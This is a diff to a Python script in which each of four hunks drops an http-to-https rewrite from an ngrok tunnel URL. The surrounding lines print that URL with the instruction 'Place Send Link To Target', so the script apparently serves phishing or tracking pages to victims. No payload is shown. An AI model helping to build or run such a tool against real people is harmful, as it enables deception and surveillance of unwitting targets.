@@ -164,7 +164,7 @@ init();
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
     banner.banner()
     global token
-    a = ngrok.connect(2424,"http",region="au",auth_token=token).replace("http://","https://")
+    a = ngrok.connect(2424,"http",region="au",auth_token=token)
     print(Fore.GREEN+" [+] "+Fore.WHITE+a)
     print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Place Send Link To Target")
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
@@ -381,7 +381,7 @@ init();
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
     banner.banner()
     global token
-    a = ngrok.connect(2424,"http",region="au",auth_token=token).replace("http://","https://")
+    a = ngrok.connect(2424,"http",region="au",auth_token=token)
     print(Fore.GREEN+" [+] "+Fore.WHITE+a)
     print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Place Send Link To Target")
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
@@ -766,7 +766,7 @@ init();
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
     banner.banner()
     global token
-    a = ngrok.connect(5252,"http",region="au",auth_token=token).replace("http://","https://")
+    a = ngrok.connect(5252,"http",region="au",auth_token=token)
     print(Fore.GREEN+" [+] "+Fore.WHITE+a)
     print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Place Send Link To Target")
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
@@ -837,7 +837,7 @@ def micro():
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
     banner.banner()
     global token
-    a = ngrok.connect(4545,"http",region="au",auth_token=token).replace("http://","https://")
+    a = ngrok.connect(4545,"http",region="au",auth_token=token)
     print(Fore.GREEN+" [+] "+Fore.WHITE+a)
     print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Place Send Link To Target")
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
